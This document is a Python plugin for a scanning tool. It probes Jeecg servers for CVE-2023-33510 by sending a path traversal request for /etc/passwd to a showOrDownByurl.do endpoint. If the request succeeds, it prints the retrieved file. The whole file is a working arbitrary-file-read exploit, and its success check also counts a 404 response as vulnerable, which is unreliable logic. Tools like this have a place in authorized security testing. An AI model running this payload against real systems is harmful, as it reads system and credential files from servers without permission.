#!/user/bin/env python3
# -*- coding: utf-8 -*-
import urllib3
import requests
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet
from pub.com.output import OutPutFile
urllib3.disable_warnings()
class Cve_2023_33510:
    def main(self,target):
        self.batch = target["batch_work"]
        if not self.batch:
            OutPrintInfo("Jeecg", '开始检测Jeecg任意文件读取漏洞')
        url = target["url"].strip('/ ')
        ssl = target["ssl"]
        header = target["header"]
        proxy = target["proxy"]
        _, proxies = ReqSet(proxy=proxy, bwork=self.batch)
        req_url = f"{url}/chat/imController/showOrDownByurl.do?dbPath=../../../../../../etc/passwd"
        try:
            headers = {
                "User-Agent": header,
                "Accept-Encoding": "gzip",
                "Accept": "*/*",
                "Accept-Language": "en",
                "Connection": "close",
            }
            response = requests.post(req_url, verify=ssl, timeout=5,headers=headers,proxies=proxies)
            response.encoding = response.apparent_encoding
            if 'root:x' in response.text or response.status_code == 404:
                OutPrintInfoSuc("Jeecg", f'存在Jeecg任意文件读取漏洞：{req_url}')
                if not self.batch:
                    OutPrintInfo("Jeecg", response.text)
                else:
                    OutPutFile("jeecg_2023_33510.txt",f'存在Jeecg任意文件读取漏洞：{req_url}')
            else:
                if not self.batch:
                    OutPrintInfo("Jeecg", '不存在Jeecg任意文件读取漏洞')
        except requests.RequestException as e:
            if not self.batch:
                OutPrintInfo("Jeecg", '目标请求出错')

        if not self.batch:
            OutPrintInfo("Jeecg", 'Jeecg任意文件读取漏洞检测结束')